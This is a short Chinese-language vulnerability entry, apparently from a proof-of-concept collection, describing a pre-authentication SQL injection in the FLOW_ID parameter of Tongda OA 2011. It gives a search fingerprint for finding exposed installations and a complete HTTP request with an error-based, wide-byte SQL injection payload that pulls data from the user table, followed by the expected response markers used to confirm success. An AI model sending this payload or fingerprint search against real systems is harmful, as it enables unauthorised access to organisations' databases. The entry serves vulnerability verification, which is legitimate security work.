﻿# 通达OA FLOW_ID 前台SQL注入漏洞

> 更新时间：2023-12-25

> 漏洞编号：

> 漏洞说明：通达OA（Office Anywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。通达OA为各行业不同规模的众多用户提供信息化管理能力，包括流程审批、行政办公、日常事务、数据统计分析、即时通讯、移动办公等，帮助广大用户降低沟通和管理成本，提升生产和决策效率。通达OA FLOW_ID存在前台SQL注入漏洞,攻击者通过漏洞可以获取数据库信息。影响版本 通达OA2011

> 漏洞特征：title="office Anywhere" && icon_hash="-759108386" && "2011"

> 验证脚本：HTTP

```
GET /general/score/flow/scoredate/result.php?FLOW_ID=11%bf%27%20and%20%28SELECT%201%20from%20%28select%20count%28*%29,concat%28floor%28rand%280%29*2%29,%28substring%28%28select%20md5%281122%29%20from%20user%20limit%201%29,1,62%29%29%29a%20from%20information_schema.tables%20group%20by%20a%29b%29%23 HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=5c69ce55fd8e8aba091b846170af39d0; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=3bf14bb4; UI_COOKIE=0
Upgrade-Insecure-Requests: 1
```

> 响应代码特征：200

> 响应内容特征：3b712de481375

> 上传文件定位：


> 验证文件来源：通达OA FLOW_ID 前台SQL注入漏洞.poc
